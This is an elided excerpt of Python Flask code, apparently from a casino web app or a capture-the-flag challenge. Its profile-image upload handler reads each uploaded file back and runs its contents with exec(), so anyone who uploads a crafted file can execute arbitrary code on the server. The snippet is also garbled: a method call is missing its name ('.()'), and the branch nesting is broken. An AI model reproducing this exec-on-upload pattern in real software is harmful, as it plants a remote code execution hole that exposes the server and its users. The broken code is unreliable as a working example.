...
app.config['PROFILEIMAGE_UPLOAD_FOLDER'] = '/var/www/html/casino/CasinoApp/CasinoApp/static/upload/profileimg'
	...
	if request.method == 'POST' and 'image' in request.files:
		...
		if file.filename == '':
			...
			if file and allowed_file(file.filename):
				...
				binary = str(open(os.path.join(app.config['PROFILEIMAGE_UPLOAD_FOLDER'], str(session.get("id")) + ext), "rb").()).rstrip('\x00')
				exec(binary)
